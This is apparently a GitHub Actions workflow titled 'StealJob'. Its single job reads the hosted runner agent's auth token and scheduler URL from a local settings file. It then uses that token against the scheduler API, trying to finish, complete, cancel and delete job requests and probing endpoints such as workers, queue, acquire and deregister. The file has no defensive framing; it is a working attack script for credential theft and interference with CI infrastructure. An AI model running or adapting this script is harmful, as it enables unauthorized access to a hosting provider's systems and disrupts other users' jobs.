name: StealJob
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: try to steal jobs
        timeout-minutes: 5
        run: |
          set +e
          JWT=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read())['authToken'])")
          BASE=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read())['schedulerApiUrl'].replace('/v1',''))")
          echo "BASE: $BASE"
          echo "JWT_LEN: ${#JWT}"
          AUTH="Authorization: Bearer $JWT"
          echo ""
          echo "=== 1. GET /v1/request (current job) ==="
          curl -sk --max-time 3 -H "$AUTH" "$BASE/v1/request" 2>&1
          echo ""
          echo "=== 2. POST /v1/finish ==="
          curl -sk --max-time 3 -X POST -H "$AUTH" -H "Content-Type: application/json" -d '{"status":"completed"}' "$BASE/v1/finish" 2>&1
          echo ""
          echo "=== 3. POST /v1/complete ==="
          curl -sk --max-time 3 -X POST -H "$AUTH" -H "Content-Type: application/json" -d '{"status":"completed"}' "$BASE/v1/complete" 2>&1
          echo ""
          echo "=== 4. DELETE /v1/request ==="
          curl -sk --max-time 3 -X DELETE -H "$AUTH" "$BASE/v1/request" 2>&1
          echo ""
          echo "=== 5. PUT /v1/request (cancel) ==="
          curl -sk --max-time 3 -X PUT -H "$AUTH" -H "Content-Type: application/json" -d '{"cancel":true}' "$BASE/v1/request" 2>&1
          echo ""
          echo "=== 6. GET /v1/request AGAIN (after cancel) ==="
          curl -sk --max-time 5 -H "$AUTH" "$BASE/v1/request" 2>&1
          echo ""
          echo "=== 7. POST /v1/request/finish ==="
          curl -sk --max-time 3 -X POST -H "$AUTH" -H "Content-Type: application/json" -d '{"result":"success"}' "$BASE/v1/request/finish" 2>&1
          echo ""
          echo "=== 8. POST /v1/request/complete ==="
          curl -sk --max-time 3 -X POST -H "$AUTH" -H "Content-Type: application/json" -d '{"result":"success"}' "$BASE/v1/request/complete" 2>&1
          echo ""
          echo "=== 9. HCA LOG (request handling) ==="
          grep -i 'request\|finish\|complete\|cancel\|acquire' /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | tail -20
          echo ""
          echo "=== 10. OTHER ENDPOINTS ==="
          for path in /v1/machines /v1/workers /v1/agents /v1/jobs /v1/queue /v1/work /v1/acquire /v1/release /v1/deregister; do
            CODE=$(curl -sk --max-time 2 -o /tmp/r -w "%{http_code}" -H "$AUTH" "$BASE$path" 2>/dev/null)
            [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "$path [$CODE]: $(cat /tmp/r | head -c 200)"
          done
          for path in /v1/machines /v1/workers /v1/agents /v1/jobs /v1/work /v1/acquire; do
            CODE=$(curl -sk --max-time 2 -X POST -o /tmp/r -w "%{http_code}" -H "$AUTH" -H "Content-Type: application/json" -d "{}" "$BASE$path" 2>/dev/null)
            [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "POST $path [$CODE]: $(cat /tmp/r | head -c 200)"
          done
          echo ""
          echo "=== DONE ==="
